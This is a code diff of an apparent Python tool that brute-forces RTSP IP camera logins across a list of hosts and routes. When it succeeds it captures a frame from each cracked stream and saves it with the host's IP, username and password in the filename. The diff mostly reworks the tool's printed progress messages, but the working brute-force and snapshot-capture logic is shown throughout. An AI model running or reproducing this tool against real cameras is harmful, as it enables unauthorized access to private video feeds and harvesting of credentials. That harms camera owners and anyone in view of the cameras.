@@ -39,12 +39,10 @@ def logging(url):
 
 def get_capture(url):
 	if 'FAKE' in url:
-		print(' ...[-] Fake trigger')
 		return False
 	vcap = VideoCapture(url)
 	ret, frame = vcap.read()
 	if type(frame) != ndarray:
-		print(' ...[-] Fake trigger')
 		return False
 	else:
 		ip = url.split('/')[2].split('@')[1]
@@ -53,7 +51,6 @@ def get_capture(url):
 		path = url.split('/')[3]
 		path = remove_forbidden_symbols(path)
 		imwrite('pics/%s_%s_%s_%s.jpg' % (ip, usr, pwd, path), frame)
-		print(' ...[+] Snapshot was downloaded! ' + url)
 		return True
 
 if __name__ == '__main__':
@@ -83,7 +80,9 @@ administrator:'''
 
 	for (line, host) in enumerate(HOSTS):
 		state = False
-		print("[%s/%d] Working with %s" % (line+1, len(HOSTS), host))
+		state_str = "[%s/%d]" % (line+1, len(HOSTS))
+		dots = '.'*(len(state_str)-3)
+		print("%s Working with %s" % (state_str, host))
 		for route in ROUTES:
 			try:
 				create_describe_packet('', host, route)
@@ -92,32 +91,35 @@ administrator:'''
 				#sleep(12)
 				if '404 Not Found' not in data and '\x15\x00\x00\x00\x02\x02' not in data and '400' not in data and '403' not in data and '451' not in data and '503' not in data:
 					#print(data)
-					print(' ...[+] Starting bruteforce')
+					print(dots + '[+] Starting bruteforce')
 					for (i,cred) in enumerate(CRED):
 						create_describe_packet(cred, host, route)
 						data = rtsp_connect(DESCRIBEPACKET, host, PORT)
 						#print(data)
 						if '401 Unauthorized' not in data and '503' not in data:
 							url = "rtsp://%s@%s%s" % (cred, host, route)
-							print(' ...[+] Successful! ' + url)
-							get_capture(url)
-							logging(url)
+							print(dots + '[+] Successful! ' + url)
+							if get_capture(url):
+								print(dots + '[+] Snapshot was downloaded! ')
+								logging(url)
+							else:
+								print(dots + '[-] Fake trigger')
 							state = True
 							break
 						if i+1 == len(CRED):
 							url = 'rtsp://' + host + route
-							print(' ...[-] Bruteforce has failed')
+							print(dots+ '[-] Bruteforce has failed')
 							logging(url)
 							state = True
 							break
 				if state: break
 			except KeyboardInterrupt:
-				print(" ...[-] Terminated by user...")
+				print(dots + '[-] Terminated by user...')
 				exit()
 			except socket.timeout:
-				print(" ...[-] Socket timeout")
+				print(dots + '[-] Socket timeout')
 				break
 			except:
-				print(" ...[-] Connection error")
+				print(dots + '[-] Connection error')
 				break
 
